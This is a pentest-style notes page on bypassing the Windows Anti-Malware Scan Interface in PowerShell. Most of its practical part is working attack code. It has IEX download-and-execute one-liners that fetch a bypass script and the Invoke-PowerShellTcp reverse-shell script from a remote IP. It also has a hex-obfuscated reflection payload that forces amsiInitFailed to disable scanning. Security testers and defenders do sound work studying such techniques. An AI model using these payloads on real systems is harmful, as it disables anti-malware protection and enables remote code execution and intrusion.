# AMSI Bypass

## Introduction

The Anti-Malware Scan Interface (AMSI) is a security feature of PowerShell that will allow any application or service to integrate with anti-malware products. AMSI will scan payloads and scripts prior to execution within the runtime. From Microsoft, "The Windows Anti-Malware Scanning Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any anti-malware product that is present on a machine. AMSI provides enhanced malware protection for your end users and their data, applications and workloads."

## Theory

{% content-ref url="theory-amsi.md" %}
[theory-amsi.md](theory-amsi.md)
{% endcontent-ref %}

## Practice

### Verification

```powershell
$str = "amsiinitfailed"
$str
```

### Bypass methods

{% tabs %}
{% tab title="amsi.fail" %}
{% embed url="https://amsi.fail" %}

* The first thing we do is to generate a bypass method.
* Then, we can generate the chosen payload in encoded form.

![](../../../../.gitbook/assets/amsi\_fail\_use.png)

* We create a **.ps1** file and copy the content generated by [amsi.fail](http://amsi.fail). Then the payload will consist of the following:

{% hint style="danger" %}
We can also try running it directly in the PowerShell console.
{% endhint %}

```powershell
IEX(IWR -UseBasicParsing http://<IP>/amsibypass.ps1) # To bypass AMSI
IEX(New-Object Net.WebClient).DownloadString('http://10.10.0.26/Invoke-PowerShellTcp.ps1')
```
{% endtab %}

{% tab title="Payloads" %}
### Hexadecimal

```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
```
{% endtab %}
{% endtabs %}
